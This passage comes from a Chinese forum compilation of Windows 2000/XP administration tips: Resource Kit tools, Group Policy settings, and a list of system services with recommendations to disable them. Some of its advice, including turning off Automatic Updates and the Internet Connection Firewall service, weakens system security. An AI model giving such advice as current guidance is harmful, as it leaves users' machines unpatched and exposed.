的时候它会自动加载Quiktray.dat。当然要把这个东西放在本机用也是没有问题的。 


7. Remapkey.exe: Remap Windows Keyboard Layout 

这个工具可以用来改变键盘的布局，重新定义你键盘上的键。我们需要管理员权限来做这种修改。这种修改会对 

整个系统造成影响，新的键甚至会影响到系统登陆时的CTRL+ALT+DEL组合，要是你定义的时候搞掉了一个，你 

就等着重装吧！如果一定要修改，可以启用自动登录解决这个问题。 

如果说我们交换了CAPs Lock和Ctrl，以后Ctrl就可以用来shift大小写了。如果交换了A和B以后凡是A的组合 

键，都变成B了，这些交换对于应用程序来说是透明的。 

GUI工具用来非常简单，只要把上面的键拖到下面的键盘上就可以了，注意改了以后一定要做一下完整性检查， 

然后在保存。如果要取消的话，点一下变红的键就可以了。如果要取消全部映射，除了在GUI底下做以外，还可 

以在命令行底下使用remapkey -c，这样最快。 

8. Runext.exe: Run Extension 

这也是一个Shell Extension，和Cmdhere.inf差不多，这是这个可以可以打开这个文件的RUN窗口，便于大 

家添加参数。但是非常可惜，这又是一个没有的工具，它只包括在ResKit光盘上。faint!!! 

9. Sipanel.exe: Soft Input Panel 

这个工具可以允许你使用输入笔做为2000的主输入设备，这个程序允许你使用手写命令传送到系统，而不需要使 

用键盘，就是那么简单，没有什么好说，那样实在是慢的要死，我看大家都不会用。这里提醒一点这个东西还不 

可以使用如Ctrl+SPace这样的组合键。 

不好用！！ 

10. Smart Sketch LE 

这个东西可以用来画图表和技术图等等。

11. Winexit.scr: Windows Exit Screen Saver 

一个微软的屏保？呵呵！其实就是个自动退出的脚本，只是写成了屏保的形式。使用这个东西系统会在指定的时间内logoff当前的用户。时间和显示的信息和自己定义。如果要让非administrator使用，需要为Everyone组在HKEY_Local_Machine\Software\Microsoft\WindowsNT\CurrentVersion这个键值上分配设置值和创建子键的权限。

虚拟空间 论坛空间 域名注册
木木是做虚拟主机的,有需要请PM联系我,可以拿到优惠价格
注意:非站务合作购买相关事宜,请不要加小木QQ,因无时间回答众热心网友的问题  


【Windows XP 组策略修改系统配置】
高手过招――使用 Windows XP 组策略修改系统配置  
［ 作者：阿榕收集整理    转贴自：阿榕论坛    点击数：2371    更新时间：2004-2-23    文章录入：阿榕 ］ 
 
组策略是管理员为计算机和用户定义的，用来控制应用程序、系统设置和管理模板的一种机制。通俗一点说，是介于控制面板和注册表之间的一种修改系统、设置程序的工具。微软自Windows NT 4.0开始便采用了组策略这一机制，经过Windows 2000发展到Windows XP已相当完善。利用组策略可以修改Windows的桌面、开始菜单、登录方式、组件、网络及IE浏览器等许多设置。

　　平时像一些常用的系统、外观、网络设置等我们可通过控制面板修改，但大家对此肯定都有不满意，因为通过控制面板能修改的东西太少；水平稍高点的用户进而使用修改注册表的方法来设置，但注册表涉及内容又太多，修改起来也不方便。组策略正好介于二者之间，涉及的内容比控制面板中的多，安全性和控制面板一样非常高，而条理性、可操作性则比注册表强。

　　本文主要介绍Windows XP Professional本地组策略的应用。本地计算机组策略主要可进行两个方面的配置：计算机配置和用户配置。其下所有设置项的配置都将保存到注册表的相关项目中。其中计算机配置保存到注册表的HKEY_LOCAL_MACHINE子树中，用户配置保存到HKEY_CURRENT_USER。
　　
一、访问组策略

　　有两种方法可以访问组策略：一是通过gpedit.msc命令直接进入组策略窗口；二是打开控制台，将组策略添加进去。

　1. 输入gpedit.msc命令访问

　　选择“开始”→“运行”，在弹出窗口中输入“gpedit.msc”，回车后进入组策略窗口（图1）。组策略窗口的结构和资源管理器相似，左边是树型目录结构，由“计算机配置”、“用户配置”两大节点组成。这两个节点下分别都有“软件设置”、“Windows设置”和“管理模板”三个节点，节点下面还有更多的节点和设置。此时点击右边窗口中的节点或设置，便会出现关于此节点或设置的适用平台和作用描述。“计算机配置”、“用户配置”两大节点下的子节点和设置有很多是相同的，那么我们该改哪一处？“计算机配置”节点中的设置应用到整个计算机策略，在此处修改后的设置将应用到计算机中的所有用户。“用户配置”节点中的设置一般只应用到当前用户，如果你用别的用户名登录计算机，设置就不会管用了。但一般情况下建议在“用户配置”节点下修改，本文也将主要讲解“用户配置”节点的各项设置的修改，附带讲解“计算机配置”节点下的一些设置。其中“管理模板”设置最多、应用最广，因此也是本文的重中之重。

　2. 通过控制台访问组策略

　　单击“开始”→“运行”，输入“mmc”，回车后进入控制台窗口。单击控制台窗口的“文件”→“添加/删除管理单元”，在弹出窗口单击“添加”（图2），之后选择“组策略”并单击“添加”（图3），在下一步的“选择组策略对象”对话框中选择对象。由于我们组策略对象就是“本地计算机”，因此不用更改，如果是网络上的另一台计算机，那么单击“浏览”选择此计算机即可。另外，如果你希望保存组策略控制台，并希望能够选择通过命令行在控制台中打开组策略对象，请选中“当从命令行开始时，允许更改‘组策略管理单元’的焦点”复选框（图4）。最后添加进来的组策略如图5所示。

二、任务栏和“开始”菜单项目设置

　　本节点允许你为开始菜单、任务栏和通知区域添加、删除或禁用某一功能项目。依次展开“用户配置”→“管理模板”→“任务栏和‘开始’菜单”，在右边窗口便能看到“任务栏和‘开始’菜单”节点下的具体设置，其状态都处在“未被配置”（图6）。

　1. 给“开始”菜单减肥

　　Windows XP的“开始”菜单的菜单项很多，可通过组策略将不需要的删除掉。以删除开始菜单中的“我的文档”图标为例看看其具体操作方法：在右边窗口中双击“从‘开始’菜单上删除‘我的文档’图标”项，在弹出对话框的“设置”标签中点选“已启用”，然后单击“确定”（图7），这样在“开始”菜单中“我的文档”图标将会隐藏。

　2. 防止隐私泄漏

　　在开始菜单中有一个“我最近的文档”菜单项，别人可通过此菜单访问你最近打开的文档，为安全起见，可删除此菜单项，并设置不保存最近打开的文档记录。双击“不要保留最近打开文档的记录”、“退出时清除最近打开的文档记录”、“从‘开始’菜单上删除‘文档’菜单”3项，在弹出对话框中点选“已启动”并确定即可。

　3. 禁止随意修改任务栏和“开始”菜单

　　为保护自己好不容易设置好的任务栏和“开始”菜单，可双击启用下列各设置。

　　“阻止更改‘任务栏和‘开始’菜单 ’设置”：即从“开始”菜单的“设置”菜单项中删除“任务栏和‘开始’菜单”项目，这个设置也可阻止用户打开“任务栏属性”对话框。“阻止访问任务栏的上下文菜单”（上下文菜单即单击右键弹出的快捷菜单）：当鼠标右键单击任务栏及任务栏上项目时隐藏菜单，例如“开始”按钮、时钟和任务栏按钮，但不能禁止用户在其他地方更改。“锁定任务栏”：启用此设置，可阻止用户移动任务栏或调整任务栏的大小，但自动隐藏和其他任务栏选项仍然在“任务栏属性”中可用。

　4. 去掉Windows XP“开始”菜单中的图形化设置

　　Windows XP的“开始”菜单增添了许多图形化设置，其实可在组策略中将这些功能关闭。

　　“关闭个性化菜单”：Windows XP会自动将最近使用的菜单项移动到开始菜单顶部，并且隐藏最近没有使用的菜单项，以此实现个性化菜单，启用此设置将关闭个性化菜单。“强制典型菜单”：启用此设置，开始菜单就以Windows 2000样式显示典型的开始菜单，并且显示标准桌面图标。

　5. 禁止“注销”和“关机”

　　进行三维动画设计和视频处理的朋友经常会为导出一个大型动画、视频文件而花几个小时，这时如果有人重新启动电脑或注销用户，那么前面所做的工作就会白白浪费，因此有必要禁止“开始”菜单中的“注销”、“关机”菜单项。你只需双击启用“删除‘开始’菜单上的‘注销’”和“删除和阻止访问‘关机’命令”两项即可。后一设置不仅将从“开始”菜单中删除“关闭计算机”项，而且还会禁用“Windows 任务管理器”对话框中的“关机”选项（图8）。
　　
三、桌面项目设置

　　在“组策略”的左窗口依次展开“用户配置”→“管理模板”→“桌面”节点，便能看到有关桌面的所有设置（图9）。此节点主要作用在于管理用户使用桌面的权利和隐藏桌面图标。

　1. 隐藏不必要的桌面图标

　　桌面上的一些快捷方式我们可以轻而易举地删除，但要删除“我的电脑”、“回收站”、“网上邻居”等默认图标，就需要依靠“组策略”了。例如要删除“我的文档”，只需在“删除桌面上的‘我的文档’图标”一项中设置即可。

　2. 禁止对桌面的改动

　　利用组策略可达到禁止别人改动桌面某些设置的目的。“禁止用户更改‘我的文档’路径”项可防止用户更改“我的文档”文件夹的路径。“禁止添加、拖、放和关闭任务栏的工具栏”项可阻止用户从桌面上添加或删除任务栏。双击启用“退出时不保存设置”后，用户将不能保存对桌面的更改。最后，双击启用“隐藏和禁用桌面上的所有项目”设置项，将从桌面上删除图标、快捷方式以及其他默认的和用户定义的所有项目，连桌面右键菜单都将被禁止。

　3. 启用或禁止活动桌面

　　利用“Active Desktop”项，可根据自己的需要设置活动桌面的各种属性。“启用活动桌面”项可启用活动桌面并防止用户禁用它。“活动桌面墙纸”项可指定在所有用户的桌面上显示的桌面墙纸（图10）。而启用“不允许更改”项便可防止用户更改活动桌面配置。
　　
四、隐藏或禁止控制面板项目

　　这里讲到的控制面板项目设置是指配置控制面板程序的各项设置，主要用于隐藏或禁止控制面板项目。在组策略左边窗口依次展开“用户配置”→“管理模板”→“控制面板”项，便可看到“控制面板”节点下面的所有设置和子节点（图11）。

　1. 隐藏或禁止“添加/删除程序”项

　　展开“添加/删除程序”项：双击启用“删除‘添加/删除程序’程序”设置项后，控制面板中的“添加/删除程序”项将被删除。此外在“添加或删除程序”对话框中共有3个页面：“更改或删除程序”、“添加新程序”以及“添加/删除Windows组件”；而当你进入“添加新程序”页面时，会发现有3个选项：“从CD-ROM或软盘添加程序”、“从 Microsoft添加程序”以及“从网络中添加程序”（图12），如果你想这些具体页面或选项隐藏，可直接在组策略“添加/删除程序”项中将相应隐藏功能启用。

　2. 隐藏或禁止“显示”项

　　展开“显示”项，发现这一项和上一项一样，可隐藏“显示属性”对话框中的选项卡。这里就不细讲了，例如双击启用“隐藏‘桌面’选项卡”后，“显示窗口”中将不再出现“桌面”项（图13）。此外，在这里用户还可启用“删除控制面板中的‘显示’”，这样在控制面板中双击打开“显示”项时，就会弹出一个对话框提示你：系统管理员禁止使用“显示”控制面板（图14）。

　3. 其他

　　依次展开“显示”→“桌面主题”项，双击启用“删除主题选项”、“阻止选择窗口和按钮式样”、“禁止选择字体大小”项后，可阻止他人更改主题、窗口和按钮式样、字体。展开“打印机”项，双击启用“阻止添加打印机”或“阻止删除打印机”可防止别的用户添加或删除打印机。最后，直接在“控制面板”一项下启用“禁止访问控制面板”，控制面板将无法启动。
　　
五、系统项目设置

　　这一项在“用户配置”→“管理模板”→“系统”中设置（图15）。组策略中对系统的设置涉及到登录、电源管理、组策略、脚本等很多项目，下面把和我们联系紧密的部分清理出来分类列举如下：

　1. 登录时不显示欢迎屏幕界面

　　Windows 2000和Windows XP系统登录时默认情况下都有欢迎屏幕，虽然漂亮但也麻烦且延长登录时间，通过组策略便可将其除去。双击启用“系统”节点下的“登录时不显示欢迎屏幕”，则每次用户登录时欢迎屏幕将隐藏。

　2. 禁用注册表编辑器

　　为防止他人修改注册表，可在组策略中禁止访问注册表编辑器。双击启用“系统”节点下的“阻止访问注册表编辑器”项后，用户试图启动注册表编辑器时，系统将提示：注册编辑已被管理员停用（图16）。另外，如果你的注册表编辑器被锁死，也可双击此设置，在弹出对话框的“设置”标签中点选“未被配置”项，这样你的注册表便解锁了。如果要防止用户使用其他注册表编辑工具打开注册表，请双击启用“只运行许可的Windows应用程序”。

　3. 关闭系统自动播放功能

　　一旦你将光盘插入光驱中，Windows XP就会开始读取光驱，并启动相关的应用程序。这样虽然给我们的工作带来了便利，在某些时候也带来了不少麻烦。在“系统”节点下有一项为“关闭自动播放”设置项，双击其并在弹出对话框的“设置”标签中点选“已启用”，在“关闭自动播放”框中选择“CD-ROM启动器”或“所有驱动器”项即可（图17）。

　　注意：此设置不阻止自动播放音乐CD。

　4. 关闭Windows自动更新

　　每当用户连接到Internet，Windows XP就会搜索用户计算机上的可用更新，根据配置的具体情况，在下载的组件准备好安装时或在下载之前，给用户以提示。如果你不喜欢比尔老大这种自作主张的态度，可通过组策略关闭这一功能。只须双击“系统”节点下的“Windows自动更新”设置项，在弹出来的对话框中点选“已禁用”并确定即可。

　5. Ctrl+Alt+Del选项

　　若Windows XP用户已取消“使用欢迎屏幕”项，若同时按下“Ctrl+Alt+Del”键，便会弹出一个“Windows安全”对话框，此对话框中有“锁定计算机”、“注销”、“关机”、“更改密码”、“任务管理器”、“取消”6个功能按钮（图18）。大家都知道这里的每个按钮对系统都起着关键的作用。为了阻止别人操作，可通过组策略屏蔽这些按钮。

　　找到“系统”下的“Ctrl+Alt+Del选项”，双击启用“删除任务管理器”、“删除‘锁定计算机’”、“删除改变密码”、“删除注销”项便能屏蔽掉“Windows安全”对话框的“任务管理器”、“锁定计算机”、“更改密码”、“取消”4个功能按钮。

　　注意：“注销”、“关机”两个菜单项的屏蔽，在“用户配置”→“管理模板”→“任务栏和‘开始’菜单”节点下。
　　
六、隐藏或删除Windows XP资源管理器中的项目

　　一直以来，资源管理器就是Windows系统中最重要的工具，如何高效、安全地管理资源也一直是电脑用户的不懈追求。依次展开“用户配置”→“管理模板”→“Windows组件”→“Windows资源管理器”项，可以看到“Windows资源管理器”节点下的所有设置（图19）。下面就来看看怎样通过组策略实现资源管理器个性化。

　1. 删除“文件夹选项”

　　“文件夹选项”是资源管理器中一个重要的菜单项，通过它可修改文件的查看方式，编辑文件类型的打开方式（图20）。我们自己对其设定好后，为了防止他人随意更改，可将此菜单项删除，你只须双击启用“从‘工具’菜单删除‘文件夹选项’菜单”便能完成这一设置。

　2. 隐藏“管理”菜单项

　　在资源管理器中右键单击“我的电脑”出现的快捷菜单中有一个“管理”菜单项，通过此菜单项，可以打开一个包含“事件查看器”、“本地用户和组”、“设备管理器”、“磁盘管理”等众多工具的“计算机管理”窗口（图21）。为了保障你的计算机免受他人无意破坏，可通过双击启用“隐藏Windows资源管理器上下文菜单上的‘管理’项目”项来屏蔽此菜单项。

　3. 其他项目的隐藏

　　此外通过启用“隐藏‘我的电脑’中的这些指定的驱动器”可隐藏你指定的驱动器（图22）。还可通过启用“‘网上邻居’中不含‘整个网络’”屏蔽掉“整个网络”项。双击启用“删除CD烧录功能”删除Windows XP自带的光盘刻录功能。双击启用“不要将已删除的文件移到‘回收站’”则以后删除文件时将不进入回收站直接删除掉。当然还有不少项目这里没有讲到，大家可根据需要自行探讨，进行适当的配置。
　　
七、IE浏览器项目设置

　　在组策略左边窗口中依次展开“用户配置”→“管理模板”→“Windows组件”→“Internet Explorer”项，在右边窗口中便能看到“Internet Explorer”节点下的所有设置和子节点（图23）。IE是Windows XP自带的网页浏览器，也是大多数用户采用的浏览器，但其安全性也为人所诟病，下面就通过组策略来对其进行“改造”。

　1. 在IE工具栏添加快捷方式

　　不知道大家注意到了没有，不少软件在安装完之后都会在IE工具栏上添加图标，单击其便能启用相应程序。其实用组策略可以在IE工具栏上为任何程序添加快捷方式，这里举例说明如何添加一个ICQ的启动图标。展开“Internet Explorer维护”下的“浏览器用户界面”，双击“浏览器工具栏自定义”设置项，在弹出来的对话框中单击“添加”按钮，在“浏览器工具栏按钮信息”对话框的“工具栏标题”中输入：ICQ，在“工具栏操作”中输入D:\Fun\ICQLite\ICQLite.exe，然后再随便选择一个“颜色图标”和“灰度图标”（图24，当然你也可以用ExeScope等来提取ICQ的图标）。单击“确定”后IE工具栏中便多了一个ICQ图标！

　2. 让IE插件不再骚扰你

　　我们平常上网浏览网页时，总会弹出一些诸如“是否安装Flash插件”、“是否安装3721网络实名”的提示，就像广告窗口一样烦人。实际上我们可在组策略中通过启用“Internet Explorer”节点下的“禁用Internet Explorer组件的自动安装”来禁止这种提示的出现。不过有时这一功能也是很用的，所以在禁止此功能之前请稍加考虑。

　3. 保护好你的个人隐私

　　一般通过单击IE工具栏上的“历史”按钮，便可了解以前浏览过的网页和文件。为保密起见，你可以通过双击启用“Internet Explorer”节点下的“不要保留最近打开文档的记录”和“退出时清除最近打开的文档记录”两个设置项，这样再单击IE工具栏上的“历史”按钮，你访问过的历史网页记录将全部消失。

　4. 禁止项

　　如果不希望他人对你的主页进行修改，可启用“Internet Explorer”节点下的“禁用更改主页设置”设置项禁止别人更改你的主页（图25）。你也可通过访问“浏览器菜单”，启用其中的设置项对IE浏览器的若干菜单项进行屏蔽。最后，在“Internet控制面板”节点下，你还可对“Internet选项”对话框中的部分选项卡进行隐藏（图26）。
　　
八、系统安全设置

　　自有计算机以来，安全一直就是人们关注的焦点问题，Windows XP也不例外。在组策略中，系统安全配置一般在“计算机配置”→“Windows设置”→“安全设置”中进行。

　1. 密码策略

　　这一策略在“账户策略”→“密码策略”节点中配置（图27）。口令是系统安全的一大隐患，可通过组策略设置密码（口令）的最小长度：双击启用“密码必须符合复杂性要求”设置项，确定后双击“密码长度最小值”设置项，在弹出来的对话框中将密码长度最小值设为8或更大，这样以后设置账户密码时就必须输入8位以上，安全性就高多了。

　2. 用户权利指派

　　展开“本地策略”→“用户权利指派”节点，在右边窗口中便能看到“用户权利指派”节点下的所有设置（图28）。合适地指派用户权利可以解决一些奇怪的问题，例如在局域网中使用Windows XP系统的朋友一般会发现一个奇怪的现象，那就是即使你启用guest用户并给予权限，局域网中的其他Win9X操作系统的用户还是无法访问Windows XP系统中的共享资源。这个问题可在组策略中通过修改有关设置解决：双击“用户权利指派”节点下的“拒绝从网络访问这台计算机”设置项，在弹出对话框中点选“guest”，然后单击“删除”，最后确定即可（图29）。在“用户权利指派”节点下还可给用户添加许多权限，例如给guest添加远程关机权限、给一般用户添加更改系统时间的权限，限于篇幅，在此不再赘述  
 


【Windows2000-XP服务攻略】
Windows2000/XP服务攻略


对于我们经常使用的windows 2000/xp,其中有许多服务，那么这些服务都是干什么的呢？我们需要哪些？不需要哪些？在此向大家做一个介绍。

　　 Win32服务程序由3部分组成：服务应用程序，服务控制程序和服务控制管理器。其中服务控制管理器维护着注册表中的服务数据，服务控制程序则是控制服务应用程序的模块，是控制服务应用程序同服务管理器之间的桥梁。服务应用程序是服务程序的主体程序，他是一个或者多个服务的可执行代码。我们可以在控制面板--管理工具--服务中找到。可以修改他们的当前状态和启动方式，它的启动方式有三种：“自动“是之当计算机启动或者需要的时候就开启。“手动“是可以在命令提示符中通过“net start“命令打开和“net stop“命令关闭的，“已禁止“是指在改变启动方式前，不再启动。 
　　 
　　　　在众多服务程序中他们很多是互相依存的，所以我们不能随便的便停止某项服务，否则很可能造成系统的非正常情况出现，但是有的服务对我们来说的确没有什么作用，而且还占据着我们宝贵的系统资源，其实有很多程序是我们用不到的，可以关闭，从而达到节省资源的目的。 
　　 
----------------------------------------------

　　Alert（警报器） 
　　　　通知选取的使用者及计算机系统管理警示。如果停止这个服务，使用系统管理警示的程序将不会收到通知。所有依存于它的服务将无法启动。一般家用计算机根本不需要传送或接收计算机系统管理来的警示(Administrative Alerts)，除非你的计算机用在局域网络上 
　　　　依存：Workstation 
　　　　建议：停用 
　　 
　　　　Application Layer Gateway Service 
　　　　提供因特网联机共享和因特网联机防火墙的第三方通讯协议插件的支持如果你不使用因特网联机共享 (ICS) 提供多台计算机的因特网存取和因特网联机防火墙 (ICF) 软件你可以关掉 
　　　　依存：Internt Connection Firewall (ICF) / Internet Connection Sharing (ICS) 
　　　　建议：停用 
　　 
　　　　Application Management (应用程序管理) 
　　　　从win2000开始引入的一种基于msi文件格式的全新有效软件管理方案--应用程序管理组件服务，不仅可可以管理软件的安装、删除，还可以使用此服务修改、修复现有应用程序，监视文件复原并通过复原排除基本故障等。 
　　　　建议：手动 
　　 
　　 
　　Automatic Updates 
　　　　启用重要 Windows 更新的下载及安装。如果停用此服务，可以手动的从 Windows Update 网站上更新操作系统。允许 Windows 于背景自动联机之下，到 Microsoft Servers 自动检查和下载更新修补程序 
　　　　建议：停用 
　　 
　　　　Background Intelligent Transfer Service 
　　　　使用闲置的网络频宽来传输数据。 经由 Via HTTP1.1 在背景传输资料的东西，例如 Windows Update 就是以此为工作之一 
　　　　依存：Remote Procedure Call (RPC) 和 Workstation 
　　　　建议：停用 
　　 
　　　　ClipBook (剪贴簿) 
　　　　启用剪贴簿检视器以储存信息并与远程计算机共享。如果这个服务被停止，剪贴簿检视器将无法与远程计算机共享信息。任何明确依存于它的服务将无法启动。 把剪贴簿内的信息和其它台计算机分享，一般家用计算机根本用不到 
　　　　依存：Network DDE 
　　　　建议：停用 
　　 
　　　　COM+ Event System (COM+ 事件系统) 
　　　　支持“系统事件通知服务 (SENS)“，它可让事件自动分散到COM 组件。如果服务被停止，SENS 会关闭，并无法提供登入及注销通知，任何明显依存它的服务都无法启动。有些程序可能用到 COM+ 组件，像 BootVis 的 optimize system 应用，如事件检查内显示的 DCOM 没有启用 
　　　　依存：Remote Procedure Call (RPC) 和 System Event Notification 
　　　　建议：手动 
　　 
　　　　COM+ System Application 
　　　　管理 COM+ 组件的设定及追踪。如果停止此服务，大部分的 COM+ 组件将无法顺利运行。任何明确依存它的服务将无法启动。如事件检查内显示的 DCOM 没有启用 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：手动 
　　 
　　　　Computer Browser (计算机浏览器) 
　　　　维护网络上更新的计算机清单，并将这个清单提供给做为浏览器的计算机。如果停止这个服务，这个清单将不会被更新或维护。如果停用这个服务，所有依存于它的服务将无法启动。 一般家庭用计算机不需要，除非你的计算机应用在局域网之上，不过在大型的局域网上有必要开这个拖慢速度吗？ 
　　　　依存：Server 和 Workstation 
　　　　建议：停用 
　　 
　　　　Cryptographic Services 
　　　　提供三个管理服务: 确认 Windows 文件认证的; 从这个计算机新增及移除受信任根证认证授权凭证的; 以及协助注册这个计算机以取得凭证的 。如果这个服务被停止，这些管理服务将无法正确工作。任何明确依存于它的服务将无法启动。简单的说就是 Windows Hardware Quality Lab (WHQL)微软的一种认证，如果你有使用 Automatic Updates ，那你可能需要这个 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：手动 
　　 
　　　　DHCP Client (DHCP 客户端) 
　　　　透过登录及更新 IP 地址和 DNS 名称来管理网络设定。使用 DSL/Cable 、ICS 和 IPSEC 的人都需要这个来指定动态 IP，如果系统不在任何网络之中，或者网络中没有DHCp服务，那么可以设置为停用。 
　　　　依存：AFD 网络支持环境、NetBT、SYMTDI、TCP/IP Protocol Driver 和 NetBios over TCP/IP 
　　　　建议：手动 
　　 
　　　　Distributed Link Tracking Client (分布式连结追踪客户端) 
　　　　维护计算机中或网络内不同计算机中 NTFS 档案间的连结。对于绝大多数用户来说，形同虚设，可以关闭，特殊用户除外。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Distributed Transaction Coordinator (分布式交换协调器) 
　　　　协调跨越多个资源管理员的信息交换，比如数据库、消息队列及档案系统。如果此服务被停止，这些交易将不会发生。任何明显依存它的服务将无法启动。如上所说的，一般家庭用计算机用不太到，除非你启用的 Message Queuing 
　　　　依存：Remote Procedure Call (RPC) 和 Security Accounts Manager 
　　　　建议：停用 
　　 
　　　　DNS Client (DNS 客户端) 
　　　　解析并快速取得这台计算机的域名系统 (DNS) 名称。如果停止这个服务，这台计算机将无法解析 DNS 名称并寻找 Active Directory 网域控制站的位置。所有依存于它的服务将无法启动。 如上所说的，另外 IPSEC 需要用到 
　　　　依存：TCP/IP Protocol Driver 
　　　　建议：手动 
　　 
　　　　Error Reporting Service 
　　　　允许对执行于非标准环境中的服务和应用程序的错误报告。微软的应用程序错误报告服务，对于大多数用户来说也没什么用处，对于盗版用户来说更没什么用处，建议停用。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 

Event Log (事件记录文件) 
　　　　启用 Windows 为主的程序和组件所发出的事件讯息可以在事件检视器中检视。这个服务不能被停止。允许事件讯息显示在事件检视器之上。 
　　　　依存：Windows Management Instrumentation 
　　　　建议：自动 
　　 
　　　　Fast User Switching Compatibility 
　　　　在多使用者环境下提供应用程序管理。另外像是注销画面中的切换使用者功能，一般建议不要停止，否则很多功能无法实现。 
　　　　依存：Terminal Services 
　　　　建议：手动 
　　 
　　　　Help and Support 
　　　　微软提供的可以支持说明和帮助文件的服务。如果这个服务停止，将无法使用说明及支持中心。它的所有依存服务将无法启动。 如果不使用就关了吧，现实中证明没有多少人需要它，除非有特别需求，否则建议停用。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Human Interface Device Access 
　　　　启用对人体工程学接口装置 (HID) 的通用输入存取，HID 装置启动并维护对这个键盘、远程控制、以及其它多媒体装置上事先定义的快捷纽的使用。如果这个服务被停止，这个服务控制的快捷纽将不再起作用，任何明确依存于它的服务将无法启动。如果没有什么HID装置，可以停用 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：手动 
　　 
　　　　IMAPI CD-Burning COM Service 
　　　　使用 Image Mastering Applications Programming Interface (IMAPI) 来管理光盘刻录。如果这个服务被停止，这个计算机将无法刻录光盘。任何明确地依赖它的服务将无法启动。 XP 整合的 CD-R 和 CD-RW 光驱上拖放的烧录功能，可惜比不上烧录软件，关掉还可以加快 Nero 的开启速度，如果不习惯使用第三方软件，请保留。 
　　　　建议：停用 
　　 
　　　　Indexing Service (索引服务) 
　　　　本机和远程计算机的索引内容和档案属性; 透过弹性的查询语言提供快速档案存取。 简单的说可以让你加快搜查速度，不过我想应该很少人和远程计算机作搜寻吧，除非特殊工作 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　　　Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS) 
　　　　为您的家用网络或小型办公室网络提供网络地址转译、寻址及名称解析服务和防止干扰的服务。如果你不使用因特网联机共享(ICS)或是 XP 内含的因特网联机防火墙(ICF)你可以关掉 
　　　　依存：Application Layer Gateway Service、Network Connections、Network Location Awareness(NLA)、Remote Access Connection Manager 
　　　　建议：停用 
　　 
　　　　IPSEC Services (IP 安全性服务) 
　　　　管理 IP 安全性原则并启动 ISAKMP/Oakley (IKE) 及 IP 安全性驱动程序。协助保护经由网络传送的数据。IPSec 为一重要环节，为虚拟私人网络 (VPN) 中提供安全性，而 VPN 允许组织经由因特网安全地传输数据。在某些网域上也许需要，但是一般使用者大部分是不太需要的 
　　　　依存：IPSEC driver、Remote Procedure Call (RPC)、TCP/IP Protocol Driver 
　　　　建议：手动 
　　 
　　　　Logical Disk Manager (逻辑磁盘管理员) 
　　　　侦测及监视新硬盘磁盘，以及传送磁盘区信息到逻辑磁盘管理系统管理服务以供设定。如果这个服务被停止，动态磁盘状态和设定信息可能会过时。任何明确依存于它的服务将无法启动。磁盘管理员用来动态管理磁盘，如显示磁盘可用空间等和使用 Microsoft Management Console(MMC)主控台的功能 
　　　　依存：Plug and Play、Remote Procedure Call (RPC)、Logical Disk Manager Administrative Service 
　　　　建议：自动 
　　 
　　　　Logical Disk Manager Administrative Service (逻辑磁盘管理员系统管理服务) 
　　　　设定硬盘磁盘及磁盘区，服务只执行设定程序然后就停止。使用 Microsoft Management Console(MMC)主控台的功能时才用到 
　　　　依存：Plug and Play、Remote Procedure Call (RPC)、Logical Disk Manager 
　　　　建议：手动 
　　 
　　　　Messenger (信使服务) 
　　　　在客户端及服务器之间传输网络传送及 "Alerter]"服务短信。这个服务与 Windows Messenger 无关。如果停止这个服务，Alerter 讯息将不会被传输。所有依存于它的服务将无法启动。比如网络之间互相传送提示信息的功能，net send 功能，如不想被骚扰话可关了。 
　　　　依存：NetBIOS Interface、Plug and Play、Remote Procedure Call (RPC)、Workstation 
　　　　建议：停用 
　　 
　　　　MS Software Shadow Copy Provider 
　　　　管理磁盘区阴影复制服务所取得的以软件为主的磁盘区阴影复制。如果停止这个服务，就无法管理以软件为主的磁盘区阴影复制。任何明确依存于它的服务将无法启动。如上所说的，用来备份的东西，如 MS Backup 程序就需要这个服务，但是大多数人用不到这个功能。 
　　　　依存：Remote Procedure Call (RPC) 
　　　　建议：停用 
　　 
　　Net Logon 
　　　　支持网络上计算机的账户登入事件的 pass-through 验证。一般家用计算机不太可能去用到登入网络审查这个服务。 
　　　　依存：Workstation 
　　　　建议：停用 
　　 
　　　　NetMeeting Remote Desktop Sharing (NetMeeting 远程桌面共享) 
　　　　让经过授权的使用者可以使用 NetMeeting 透过公司近端内部网络，由远程访问这部计算机。如果这项服务停止的话，远程桌面共享功能将无法使用。任何依赖它的服务将无法启动。 如上说的，让使用者可以将计算机的控制权分享予网络上或因特网上的其它使用者，如果你重视安全性不想多开后门，就关了吧。 
　　　　建议：停用 
　　 
　　　　Network Connections (网络连接) 
　　　　管理在网络和拨号连接数据夹中的对象，您可以在此数据夹中检视局域网络和远程连接。控制你的网络连接 
　　　　依存：Remote Procedure Call (RPC)、Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS) 
　　　　建议：手动 
　　 
　　　　Network DDE (网络 DDE) 
　　　　为动态数据交换 (DDE) 对在相同或不同计算机上执行的程序提供网络传输和安全性。如果这个服务被停止，DDE 传输和安全性将无法使用。任何明确依存于它的服务将无法启动。 一般人好像用不到 
　　　　依存：Network DDE DSDM、ClipBook 
　　　　建议：停用 
　　 
　　　　Network DDE DSDM (网络 DDE DSDM) 
　　　　信息动态数据交换 (DDE) 网络共享。如果这个服务被停止，DDE 网络共享将无法使用。任何明确依存于它的服务将无法启动。 一般人好像用不到 
　　　　依存：Network DDE 
　　　　建议：停用 
　　 
　　　　Network Location Awareness (NLA) 
　　　　收集并存放网络设定和位置信息，并且在这个信息变更时通知应用程序。 如果不使用 ICF 和 ICS 可以关了它 
　　　　依存：AFD网络支持环境、TCP/IP Procotol Driver、Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS) 
　　　　建议：停用 
　　 
　　　　NT LM Security Support Provider (NTLM 安全性支持提供者) 
　　　　为没有使用命名管道传输的远程过程调用 (RPC) 程序提供安全性。如果不使用 Message Queuing 或是 Telnet Server 那就关了它，一般用户也用不上。 
　　　　依存：Telnet 
　　　　建议：停用 
　　 
　　　　Performance Logs and Alerts (性能记录文件及警示) 
